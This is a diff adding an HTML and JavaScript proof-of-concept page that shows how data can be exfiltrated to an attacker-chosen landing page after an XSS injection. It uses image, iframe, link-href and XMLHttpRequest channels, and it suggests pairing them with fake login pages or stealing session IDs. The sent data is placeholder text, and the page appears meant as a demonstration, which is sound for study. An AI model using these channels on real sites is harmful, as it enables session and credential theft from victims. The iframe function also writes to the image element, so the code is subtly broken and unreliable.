@@ -1,0 +1,123 @@
+<html style="align:center;word-wrap:break-word;width:500px;text-align:center">
+<head>
+	
+		<h2>PoC/PoC<br>Demonstrate a few methods to send out data to a landing page</h2>
+		
+		<p>This page demonstrates a few examples on how data could be send out (e.g. after an xss related injection) to a predefined landing page. This is a very simple and basic setup to show poc.</p>
+		<p>It purpose is to demonstrate how sensitive data could be send to an alien website after an successful xss injection. These could either be used with a 'fake' copy of a login page/login window or be triggered to send out data anytime the victim visits a captured site (transfer sessionids etc.).</p>
+		<p></p>
+		<p>I would typically use either a local landing page or <a href="http://requestb.in/">http://requestb.in/</a> to inspect the data send out. You can either use the input field to define a custom landing page or you can modify the variable targetURL which holds the landing page URL.</p>
+		
+			<code>
+				...
+				var targetURL=<you landing page> <!-- -->
+				...
+			</code>
+			<br>
+			<br>
+			<br>
+			LandingPage URL: <input id="landPageInput" value="" oninput=javascript:document.getElementById("landPage").innerHTML=document.getElementById("landPageInput").value></input>
+			<p>Inspect LandingPage <button onclick=javascript:openLandingPage(document.getElementById("landPage").innerHTML) id="landPage" >#</button></p>
+			<p><button onclick=javascript:hideProxyTags();>Hide ProxyTags</button><button onclick=javascript:showProxyTags();>Show ProxyTags</button></p>
+</head>
+<body style="text-align:center">
+	<script>
+		<!-- modify this to your test landing page as needed -->
+		function getTargetURL(){
+			return document.getElementById("landPageInput").value;
+		}
+		
+		<!-- ----------------------------------------------- -->
+		var dataElement="?data=";
+		function setImgProxy(targetURL){
+			var imgData="someData sent by image proxy";
+			document.getElementById("imageProxy").src=targetURL+dataElement+"imgProxyData: "+imgData;
+			document.getElementById("pInfo").innerHTML="using ImageProxy: data send to "+targetURL+"\n{"+imgData+"}";
+		}
+		function setIframeProxy(targetURL){
+		
+			var iframeData="someData sent by iframe proxy";
+			document.getElementById("imageProxy").src=targetURL+dataElement+"iframeProxyData: "+iframeData;
+			document.getElementById("pInfo").innerHTML="using iframeProxy: data send to "+targetURL+"\n{"+iframeData+"}";
+		}
+		function setLinkProxy(targetURL){
+			var linkData="someData sent by link proxy";
+			document.getElementById("linkProxy").href=targetURL+dataElement+"linkProxyData: "+linkData;
+			document.getElementById("pInfo").innerHTML="link tags target url has been modified. click link to send data.";
+			document.getElementById("linkProxy").innerHTML="LINK TAG (modified)";
+			document.getElementById("linkProxy").style="color:red";
+		}
+		function sendData(targetURL){
+			var data="someMoreData";
+			document.getElementById("pInfo").innerHTML="using XMLHttpRequest: data send to "+targetURL+"\n{"+data+"}";
+			var x=new XMLHttpRequest();
+			x.open("POST",targetURL+dataElement+data,false); <!-- using synchronous mode for simplicity -->
+			x.send();
+			var resp=x.responseText;
+			document.getElementById("pInfo").innerHTML="using XMLHttpRequest: data send to "+targetURL+"\n{"+data+"}\n"+resp;
+		}
+		function setLandingPage(){
+			var target=document.getElementById("landPage");
+			var infoElement="?inspect";
+			target.innerHTML=targetURL+infoElement;
+		}
+		function openLandingPage(url){
+			var win=window.open(url,'_blank');
+			win.focus();
+		}
+		function hideProxyTags(){
+			var proxyTags=document.getElementsByClassName("proxyTag");
+			for (var i=0;i<proxyTags.length;i++){
+				proxyTags[i].style="display:none";
+			}
+			document.getElementById("pInfo").innerHTML="!hide all proxy tags!";
+		}
+		function showProxyTags(){
+			var proxyTags=document.getElementsByClassName("proxyTag");
+			for (var i=0;i<proxyTags.length;i++){
+				proxyTags[i].style="";
+			}
+			document.getElementById("pInfo").innerHTML="!show all proxy tags!";
+		}
+		<!-- setLandingPage(); -->
+	</script>
+	
+	
+	<p>Link to send data via XMLHttpRequest:</p>
+	<p>
+		<a href="#" onclick=javascript:sendData(getTargetURL());>SEND</a>
+	</p>
+
+	<br></br>
+	<div class="proxyTag">
+		<p>image tag</p>
+		<!-- hidden image version just uses style="display:none" -->
+		<img src="#" id="imageProxy"> IMAGE TAG</img>
+		<br></br>
+	</div>
+	<div class="linkproxyTag">
+		<p>link tag (modifying target address of link)</p>
+		<a href="#" id="linkProxy">LINK TAG</a>
+		<br></br>
+	</div>
+	<div class="proxyTag">
+		<p>iframe tag</p>
+		<!-- hidden image version just uses style="display:none" -->
+		<iframe style="height:50px" src="" id="iframeProxy"> IFRAME TAG</iframe>
+		<br></br>
+	</div>
+	
+	<button onclick=javascript:setImgProxy(getTargetURL());>useImgProxy</button>
+	<br></br>
+	<button onclick=javascript:setLinkProxy(getTargetURL());>useLinkProxy</button>
+	<br></br>
+	<button onclick=javascript:setIframeProxy(getTargetURL());>useIframeProxy</button>
+	<br></br>
+	
+	<div class="infoArea">
+		<p id="pInfo">INFO</p>
+	</div>
+
+
+</body>
+</html>
